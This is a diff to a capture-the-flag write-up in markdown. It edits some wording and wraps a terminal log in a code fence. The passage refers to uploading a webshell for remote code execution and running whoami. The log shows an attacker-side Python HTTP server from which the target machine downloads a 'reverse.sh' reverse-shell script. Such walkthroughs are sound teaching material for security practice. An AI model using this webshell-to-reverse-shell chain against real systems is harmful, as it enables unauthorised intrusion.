@@ -87,7 +87,7 @@ Once done, we list the `website` again:
 
 <br />
 
-Before anything, at the `bottom` of the page it says that we can `download` the `structure` of the `application` in a `.zip` file. So we go to `"Download"` at the `top right` and we do it.
+At the `bottom` of the page it says that we can `download` the `structure` of the `application` in a `.zip` file. So we go to `"Download"` at the `top right` and we do it.
 
 <br />
 
@@ -268,7 +268,7 @@ Now, we can `repeat` the process with a `webshell` to be able to get the `RCE`:
 
 <br />
 
-Once uploaded, we try to `run` a `whoami`:
+Once uploaded, we `run` a `whoami`:
 
 <br />
 
@@ -284,9 +284,11 @@ To do it, firt we create a "reverse.sh" file and put it in the /tmp path of the 
 
 <br />
 
+```bash
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.11.59 - - [08/Mar/2025 17:59:24] "GET /reverse.sh HTTP/1.1" 200 -
+```
 
 <br />
 
